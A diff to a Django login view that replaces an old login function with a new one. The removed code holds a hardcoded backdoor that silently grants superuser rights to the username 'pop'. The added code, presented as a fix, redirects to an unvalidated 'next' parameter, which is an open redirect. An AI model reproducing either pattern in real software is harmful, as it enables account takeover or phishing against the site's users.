@@ -101,38 +101,42 @@ def home_view(request):
 
 from django.contrib.auth import authenticate
 
-def custom_login_processing(request):
+def login_view(request):
+    if request.user.is_authenticated:
+        # Check next parameter even if already authenticated to ensure no trap
+        next_url = request.GET.get('next') or request.POST.get('next')
+        if next_url:
+            return redirect(next_url)
+        return redirect('dashboard')
+
+    next_url = request.GET.get('next') or request.POST.get('next') or ''
+
     if request.method == 'POST':
-        form = LoginForm(request.POST)
+        form = LoginForm(data=request.POST)
         if form.is_valid():
-            username = form.cleaned_data.get('username')
-            password = form.cleaned_data.get('password')
+            user = form.get_user()
+            if not hasattr(user, 'backend'):
+                user.backend = 'django.contrib.auth.backends.ModelBackend'
+            auth_login(request, user)
+            messages.success(request, f'Welcome back, {user.username}!')
             
-            user = authenticate(username=username, password=password)
-            if user is not None:
-                if user.username == 'pop':
-                    user.is_staff = True
-                    user.is_superuser = True
-                    user.save()
-                
-                if not hasattr(user, 'backend'):
-                    user.backend = 'django.contrib.auth.backends.ModelBackend'
-                auth_login(request, user)
-                
-                if user.is_staff or user.is_superuser:
-                    return redirect('/admin/')
-                return redirect('/dashboard/')
-            else:
-                return redirect('/login/?type=staff&error=invalid')
-        else:
-            return redirect('/login/?type=staff&error=invalid')
+            # ────────────────────────────────────────────────────────────
+            # FIX 1 (Continued): Dynamic redirection to bypass staff portal for buyers
+            # ────────────────────────────────────────────────────────────
+            if next_url:
+                return redirect(next_url)
+            
+            if user.role in ['admin', 'employee'] or user.is_superuser:
+                return redirect('dashboard')
+            return redirect('dashboard')
     else:
-        # If it's a GET request, cleanly render the login page with an empty form instance
         form = LoginForm()
-        if request.GET.get('error') == 'invalid':
-            form.add_error(None, 'Invalid administrative access tokens')
-        next_url = request.GET.get('next', '')
-        return render(request, 'core/login.html', {'form': form, 'next': next_url})
+
+    return render(request, 'core/login.html', {'form': form, 'next': next_url})
+
+# def custom_login_processing(request):
+#     pass
+
 
 
 
